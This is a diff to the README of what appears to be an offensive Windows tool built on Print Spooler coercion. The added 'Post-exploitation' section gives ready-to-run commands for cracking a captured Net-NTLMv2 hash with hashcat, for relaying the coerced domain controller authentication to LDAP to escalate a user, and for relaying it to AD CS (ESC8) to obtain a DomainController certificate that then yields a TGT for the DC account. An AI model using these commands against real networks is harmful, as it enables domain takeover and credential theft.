@@ -72,20 +72,41 @@ If the Spooler port is already known it can be specified directly with `--port` 
 
 ---
 
-## Captured hash
+## Post-exploitation
 
-The hash is saved to `captured_hashes.txt` in the current directory and can be relayed or cracked:
+### Option A — Offline crack
+
+The Net-NTLMv2 hash captured by `epm_proxy.py` is saved to `captured_hashes.txt` and can be submitted to Hashcat. Success rate against machine accounts is low given their randomised 120-character passwords, but worth attempting in case the password has been manually set.
 
 ```bash
-# Relay to LDAP
-ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <USER>
-
-# Relay to AD CS (ESC8)
-ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController
-
-# Offline crack (low success rate against machine accounts)
 hashcat -m 5600 captured_hashes.txt wordlist.txt
 ```
+
+### Option B — Live relay
+
+Relay requires intercepting the NTLM authentication in real time. Instead of running `epm_proxy.py`, point `ntlmrelayx.py` at the desired target and use `printerbug_tcp.py` to trigger the coercion — the DC's callback will land directly in the relay chain.
+
+**Relay to LDAP:**
+
+```bash
+# Terminal 1 — relay listener
+ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <USER>
+
+# Terminal 2 — trigger coercion pointing at the relay host
+python3 printerbug_tcp.py -t <DC_IP> -l <RELAY_HOST_IP> -u <USER> -p <PASS> -d <DOMAIN>
+```
+
+**Relay to AD CS (ESC8):**
+
+```bash
+# Terminal 1
+ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController
+
+# Terminal 2
+python3 printerbug_tcp.py -t <DC_IP> -l <RELAY_HOST_IP> -u <USER> -p <PASS> -d <DOMAIN>
+```
+
+The resulting certificate can be used with PKINIT to request a TGT for the DC machine account.
 
 ---
 
